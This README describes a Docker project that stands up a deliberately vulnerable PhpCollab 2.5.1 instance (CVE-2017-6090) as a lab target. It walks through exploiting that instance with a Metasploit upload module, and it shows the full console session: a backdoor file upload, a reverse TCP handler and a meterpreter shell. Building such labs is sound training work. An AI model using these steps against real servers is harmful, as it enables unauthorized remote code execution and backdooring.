# Containerized exploitable CVE-2017-6090
[![Docker Pulls](https://img.shields.io/docker/pulls/jlkinsel/exploit-cve-2017-6090.svg?style=plastic)](https://hub.docker.com/r/jlkinsel/exploit-cve-2017-6090/)
![License](https://img.shields.io/badge/License-Apache-blue.svg?style=plastic)

This projects builds a container running PhpCollab 2.5.1, containing
a remote code execution vulnerability as detailed in CVE-2017-6090.
In addition, there is a docker-compse file to start that container
and mysql to show the demo, and instructions to exploit are below.


## Build
`docker build -t ` **containername** `.` or use the image jlkinsel/exploit-cve-2017-6090

## Run & Configure
The easiest way to get this thing up is to use the enclosed
*docker-compose.yml* file. If I get bored at some point - or folks
show interest - I'll create a kubernetes deployment or helm chart.

So, to get things going:

```
docker-compose up
```

So far, so good! Now, phpcollab needs to be configured to use the
database, and given a default admin password. I (briefly) tried
automating this, but...well...you look like you know how to use a
browser...

* Browse to http://localhost:8088
* Scroll to bottom of GPL, click the "Offline installation" box and then click **Step 2**
* Enter the following data in fields, then click **Save**:

| Field | value |
|-------|-------|
| Database server | mysql |
| Database login | phpcollab |
| Database password | changeme |
| Database name | phpcollab |
| Notifications | False |
| Admin password | changeme (or whatever you want |

Finally, you can log in and poke around, but not necessary for the exploit.

### Note
Notice this docker composition isn't doing anything fancy for
storage. If you wish to persist the mysql database, you'll have to
add a volume definition to the mysql service definition in
`docker-compose.yml`. See examples on the [mariadb docker hub
page](https://hub.docker.com/_/mariadb/)

## Exploit
First - follow *Run & Configure* above to get the application up and running.

I didn't add an exploit in this project, because, well,
[Metasploit](https://www.rapid7.com/db/modules/exploit/unix/webapp/phpcollab_upload_exec).

New to MSF? Here's a quick overview of exploiting the container we just started:
```
docker run -ti --network exploitcve20176090_default remnux/metasploit
```
This takes a few minutes to spin things up. the *remnux/metasploit*
docker hub page covers using volumes so this won't take as long in
the future. But we're about now!

Once you get a shell prompt, let's continue:
```
# msfconsole
msf5 > use exploit/unix/webapp/phpcollab_upload_exec
msf5 exploit(unix/webapp/phpcollab_upload_exec) > set TARGET 0
TARGET => 0
msf5 exploit(unix/webapp/phpcollab_upload_exec) > set RHOST phpcollab
RHOST => phpcollab
msf5 exploit(unix/webapp/phpcollab_upload_exec) > set RPORT 80
RPORT => 80
msf5 exploit(unix/webapp/phpcollab_upload_exec) > set TARGETURI /
TARGETURI => /
msf5 exploit(unix/webapp/phpcollab_upload_exec) > exploit

[*] Started reverse TCP handler on 172.31.0.4:4444
[*] Uploading backdoor file: 1.wGvfKLDyWHL.php
[+] Backdoor successfully created.
[*] Triggering the exploit...
[*] Sending stage (37543 bytes) to 172.31.0.2
[+] Deleted 1.wGvfKLDyWHL.php

meterpreter >
```
At this point, you're in, and the games can begin.

### Note
If the name of this directory is something other than
"exploit-CVE-2017-6090" you'll have to change the --network command
above.

Also - yes, we set the remote port to 80 in msfconsole, even through
it's 8088 externally. The metasploit container is on the same network
as the phpcollab container.

